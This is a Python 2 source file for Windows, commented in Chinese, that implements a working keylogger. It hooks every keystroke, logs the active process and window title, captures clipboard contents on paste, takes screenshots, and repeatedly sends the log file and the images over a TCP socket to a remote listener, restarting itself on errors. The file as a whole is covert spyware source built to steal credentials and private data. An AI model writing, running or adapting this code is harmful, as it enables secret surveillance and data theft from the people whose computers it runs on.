#coding:gbk
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
import socket
import time
import os
import os.path
import Image
import struct
import sys

#目标地址ip/URL及端口
target_host = '127.0.0.1'
target_port = 12450

#创建一个socket对象
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#连接主机
client.connect((target_host,target_port))

#发送数据
#client.send('GET / HTTP/1.1\r\nHOST:127.0.0.1\r\n\r\n')

#接收响应
#response = client.recv(4096)
#print(response)


def restart_program():  #重启程序
    python = sys.executable
    os.execl(python, python, * sys.argv)
    send_file('log.txt')

    
def send_file(file_name):
    try:
        filename = file_name
        FILEINFO_SIZE = struct.calcsize('128sI')#编码格式大小
        fhead = struct.pack('128sI',filename,os.stat(filename).st_size)#按照规则进行打包
        client.send(fhead)#发送文件基本信息数据
        fp = open(filename,'rb')
        while 1:        #发送文件
            filedata = fp.read(10485600)
            if not filedata:
                break
            client.send(filedata)
        #print '发送完毕...'
        fp.close()
    except:
        bengkui = '程序出错,正在重启...\r\n'
        #print bengkui
        with open('log.txt','a') as f:
            f.write(bengkui)
        #time.sleep(1)
        restart_program()

def window_capture(dpath):  
    ''''' 
截屏函数,调用方法window_capture('d:\\') ,参数为指定保存的目录 
返回图片文件名,文件名格式:日期.jpg 如:2009328224853.jpg 
    ''' 
    hwnd = 0 
    hwndDC = win32gui.GetWindowDC(hwnd)   
    mfcDC=win32ui.CreateDCFromHandle(hwndDC)   
    saveDC=mfcDC.CreateCompatibleDC()   
    saveBitMap = win32ui.CreateBitmap()   
    MoniterDev=win32api.EnumDisplayMonitors(None,None)  
    w = MoniterDev[0][2][2]  
    h = MoniterDev[0][2][3]  
    #print w,h　　　＃图片大小  
    saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)   
    saveDC.SelectObject(saveBitMap)   
    saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)  
    cc=time.gmtime()  
    bmpname=str(cc[0])+str(cc[1])+str(cc[2])+str(cc[3]+8)+str(cc[4])+str(cc[5])+'.bmp' 
    saveBitMap.SaveBitmapFile(saveDC, bmpname)  
    Image.open(bmpname).save(bmpname[:-4]+".jpg")  
    os.remove(bmpname)  
    jpgname=bmpname[:-4]+'.jpg' 
    djpgname=dpath+jpgname  
    copy_command = "move %s %s" % (jpgname, djpgname)  
    os.popen(copy_command)
    send_file(jpgname)
    return bmpname[:-4]+'.jpg' 
    
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    cc=time.gmtime()  
    time_now=str(cc[0])+str(cc[1])+str(cc[2])+str(cc[3]+8)+str(cc[4])+str(cc[5])
    with open('log.txt','a') as f:
        #获取最上层的窗口句柄
        hwnd = user32.GetForegroundWindow()
        #获取进程id
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd,byref(pid))
        #将进程id存入变量中
        process_id = '%s' % pid.value
        #申请内存
        executable = create_string_buffer('\x00'*512)
        h_process = kernel32.OpenProcess(0x400|0x10,False,pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        #读取窗口标题
        windows_title = create_string_buffer('\x00'*512)
        length = user32.GetWindowTextA(hwnd,byref(windows_title),512)
        #打印
        a1 = '[PID:%s - %s - %s]'%(process_id,executable.value,windows_title.value)
        #print time_now+':'+a1+'\r\n'
        f.write(time_now+':'+a1+'\r\n')
        send_file('log.txt')
        window_capture('.\\')
        #client.send(time_now+':'+a1+'\r\n')
        #关闭handles
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)

#定义击键监听事件函数
def KeyStroke(event):
    global current_window
    cc=time.gmtime()  
    time_now=str(cc[0])+str(cc[1])+str(cc[2])+str(cc[3]+8)+str(cc[4])+str(cc[5])
    with open('log.txt','a') as f:
        #检测目标窗口是否转换（换了其它窗口就监听新的窗口）
        if event.WindowName != current_window:
            current_window = event.WindowName
            #函数调用
            get_current_process()
    
        #检测击键是否常规按键（非组合键等）
        if event.Ascii >32 and event.Ascii < 127:
            a2 = chr(event.Ascii)
            #print time_now+'[常规按键] '+a2+'\r\n'        
            f.write(time_now+':'+a2+'\r\n')
            send_file('log.txt')
            #client.send(time_now+':'+a2+'\r\n')
        else:
            #如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                pasted_value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                #乱码的原因是复制的时候，使用的是英文输入法。
                
#解决方法：http://bbs.csdn.net/topics/80362400 [10楼]
                a3 = ' [键盘Ctrl+v粘贴事件,内容如下]\r\n%s' % pasted_value
                #print time_now + a3 + '\r\n'
                f.write(time_now+':'+a3+'\r\n')
                send_file('log.txt')
                #client.send(time_now+':'+a3+'\r\n')
            else:
                a4 = "[%s]" % event.Key
                #print time_now+' [特殊按键] '+a4+'\r\n'
                f.write(time_now+':'+a4+'\r\n')
                send_file('log.txt')
                #client.send(time_now+':'+a4+'\r\n')    
        #循环监听下一个击键事件
        return True

#创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

#注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()
